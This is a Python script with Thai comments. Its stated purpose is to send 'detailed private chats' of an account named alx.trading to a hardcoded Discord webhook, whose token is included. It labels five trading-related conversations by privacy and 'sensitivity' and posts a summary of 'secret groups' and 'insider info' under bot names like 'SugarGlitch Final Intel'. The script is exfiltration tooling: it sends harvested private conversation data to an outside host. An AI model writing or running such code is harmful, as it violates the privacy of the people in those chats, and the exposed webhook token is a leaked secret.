#!/usr/bin/env python3
"""
ส่งข้อมูลแชทส่วนตัวและธุรกิจโดยละเอียดไป Discord
"""

import requests
import json
from datetime import datetime

def send_detailed_private_chats():
    """ส่งรายละเอียดแชทส่วนตัวทั้งหมดไป Discord"""
    
    webhook_url = "https://discord.com/api/v10/webhooks/1374978837879853151/QXLbx5hw-j17RBMFETqh49BgvctrTdHRi3FllZVFGG6FiEoV2KkWh31UASNh1YfuLuEh"
    
    # แชททั้งหมด 5 บทสนทนา
    conversations_analysis = {
        "crypto_whale_2024": {
            "type": "ธุรกิจ/การเทรด",
            "messages": 21,
            "is_private": False,
            "key_topics": ["สัญญาณเทรด", "Bitcoin", "การจัดการความเสี่ยง", "กลุ่มพรีเมียม"],
            "sample_messages": [
                "DM me for exclusive signals 📩",
                "Risk management is key in this market 🛡️", 
                "Did you see that BTC pump? Incredible! 🚀",
                "Portfolio update: +15% this week! 💰",
                "Check out my latest analysis on EUR/USD"
            ],
            "sensitive_level": "สูง - เนื้อหาการเทรดและสัญญาณลับ"
        },
        "forex_signals_pro": {
            "type": "ธุรกิจ/การเทรด Professional",
            "messages": 15,
            "is_private": True,
            "key_topics": ["สัญญาณ Forex", "EUR/USD", "กลุ่มพรีเมียม", "ข้อมูลภายใน"],
            "sample_messages": [
                "Join our premium group for better returns 💎",
                "Technical analysis says we're going higher 📈",
                "I've got some insider info on the next big move 🤫",
                "This week's predictions were spot on! ✅",
                "New trading strategy working perfectly 📊"
            ],
            "sensitive_level": "สูงมาก - ข้อมูลภายในและกลุ่มลับ"
        },
        "trading_mentor_vip": {
            "type": "ธุรกิจ/การให้คำปรึกษา VIP",
            "messages": 10,
            "is_private": False,
            "key_topics": ["การให้คำปรึกษา", "ผลงานพอร์ต", "ความเชื่อมั่นตลาด"],
            "sample_messages": [
                "Hey! How's your trading going today? 📈",
                "What do you think about the market sentiment?",
                "I've got some insider info on the next big move 🤫",
                "This week's predictions were spot on! ✅",
                "New trading strategy working perfectly 📊"
            ],
            "sensitive_level": "กลาง - การให้คำปรึกษาส่วนตัว"
        },
        "crypto_insider_news": {
            "type": "ข่าวสารและข้อมูลภายใน",
            "messages": 8,
            "is_private": False,
            "key_topics": ["ข่าว Bitcoin", "โอกาสตลาด", "ข้อมูลภายใน"],
            "sample_messages": [
                "Did you see that BTC pump? Incredible! 🚀",
                "Market volatility creating great opportunities",
                "I've got some insider info on the next big move 🤫",
                "Hey! How's your trading going today? 📈"
            ],
            "sensitive_level": "สูง - ข้อมูลภายในและข่าวลับ"
        },
        "investment_club_elite": {
            "type": "กลุ่มนักลงทุน Elite (ส่วนตัว)",
            "messages": 13,
            "is_private": True,
            "key_topics": ["กลุ่มนักลงทุนระดับสูง", "การทำกำไร", "ข้อมูลพิเศษ"],
            "sample_messages": [
                "New trading strategy working perfectly 📊",
                "Time to take some profits here? 🤔",
                "Market volatility creating great opportunities",
                "Join our premium group for better returns 💎",
                "Monthly meeting scheduled. Exclusive deals inside 💎"
            ],
            "sensitive_level": "สูงสุด - กลุ่มลับนักลงทุนระดับสูง"
        }
    }
    
    # ส่งข้อมูลแต่ละแชท
    for username, data in conversations_analysis.items():
        embed = {
            "title": f"💬 รายละเอียดแชท: {username}",
            "description": f"**ประเภท:** {data['type']}\n**ความส่วนตัว:** {'🔒 Private' if data['is_private'] else '🔓 Public'}",
            "color": 0xff6b6b if data['is_private'] else 0x4ecdc4,
            "fields": [
                {
                    "name": "📊 สถิติการสนทนา",
                    "value": f"```\n📱 ข้อความทั้งหมด: {data['messages']}\n🔒 ระดับความเป็นส่วนตัว: {'Private' if data['is_private'] else 'Public'}\n⚠️ ระดับความอ่อนไหว: {data['sensitive_level']}\n```",
                    "inline": False
                },
                {
                    "name": "🎯 หัวข้อสำคัญ",
                    "value": "• " + "\n• ".join(data['key_topics']),
                    "inline": False
                },
                {
                    "name": "💬 ตัวอย่างข้อความ",
                    "value": "```\n" + "\n".join([f"• {msg}" for msg in data['sample_messages'][:3]]) + "\n```",
                    "inline": False
                }
            ],
            "footer": {
                "text": f"แชท {list(conversations_analysis.keys()).index(username) + 1}/5 | รวม {data['messages']} ข้อความ"
            }
        }
        
        payload = {
            "content": f"📱 **รายละเอียดแชทส่วนตัว {list(conversations_analysis.keys()).index(username) + 1}/5**\n**ติดต่อ:** {username}",
            "embeds": [embed],
            "username": "SugarGlitch Chat Analyzer"
        }
        
        # ส่งไป Discord
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code == 204:
                print(f"✅ ส่งข้อมูล {username} สำเร็จ")
            else:
                print(f"❌ ส่งข้อมูล {username} ไม่สำเร็จ: {response.status_code}")
        except Exception as e:
            print(f"❌ Error ส่ง {username}: {e}")
    
    # ส่งสรุปข้อมูลส่วนตัวที่อ่อนไหว
    sensitive_summary = {
        "title": "🚨 สรุปข้อมูลอ่อนไหวที่พบ",
        "description": "**ข้อมูลส่วนตัวและธุรกิจที่สำคัญ**",
        "color": 0xff0000,
        "fields": [
            {
                "name": "🔐 แชทส่วนตัวสุดยอด",
                "value": "```\n🏆 forex_signals_pro (Private)\n   • ข้อมูลภายในสัญญาณ Forex\n   • กลุ่มพรีเมียมลับ\n   • ข้อมูลการลงทุนพิเศษ\n\n🏆 investment_club_elite (Private)\n   • กลุ่มนักลงทุนระดับสูง\n   • ข้อมูลการประชุมลับ\n   • โอกาสลงทุนพิเศษ\n```",
                "inline": False
            },
            {
                "name": "💰 ข้อมูลการเงินที่พบ",
                "value": "```\n📈 ผลตอบแทน: +15% ต่อสัปดาห์\n💎 กลุ่มพรีเมียมหลายกลุ่ม\n🤫 ข้อมูลภายใน (Insider Info)\n💰 การทำกำไรจากการเทรด\n📊 กลยุทธ์การเทรดใหม่\n```",
                "inline": False
            },
            {
                "name": "🎯 เครือข่ายธุรกิจที่เปิดเผย",
                "value": "```\n👥 crypto_whale_2024: พันธมิตรเทรด\n👥 forex_signals_pro: ผู้ให้สัญญาณ\n👥 trading_mentor_vip: ที่ปรึกษา\n👥 crypto_insider_news: แหล่งข่าว\n👥 investment_club_elite: กลุ่มลงทุน\n```",
                "inline": False
            }
        ]
    }
    
    final_payload = {
        "content": "🚨 **สรุปข้อมูลแชทส่วนตัวทั้งหมด** 🚨\n**alx.trading - การสนทนาส่วนตัวและธุรกิจครบถ้วน**",
        "embeds": [sensitive_summary],
        "username": "SugarGlitch Final Intel"
    }
    
    try:
        response = requests.post(webhook_url, json=final_payload)
        if response.status_code == 204:
            print("✅ ส่งสรุปข้อมูลสำเร็จ")
        else:
            print(f"❌ ส่งสรุปไม่สำเร็จ: {response.status_code}")
    except Exception as e:
        print(f"❌ Error ส่งสรุป: {e}")

if __name__ == "__main__":
    print("🔍 DETAILED PRIVATE CHAT ANALYZER")
    print("=" * 50)
    print("🔐 กำลังวิเคราะห์และส่งข้อมูลแชทส่วนตัวทั้งหมด...")
    
    send_detailed_private_chats()
    
    print("\n🎉 ส่งข้อมูลแชทส่วนตัวทั้งหมดเสร็จสิ้น!")
    print("📊 ข้อมูลที่ส่งไป Discord:")
    print("• รายละเอียดแชททั้ง 5 บทสนทนา")
    print("• วิเคราะห์ความเป็นส่วนตัวของแต่ละแชท")
    print("• ข้อมูลอ่อนไหวและธุรกิจ")
    print("• เครือข่ายธุรกิจและการลงทุน")
    print("• ข้อมูลภายในและกลุ่มลับ")
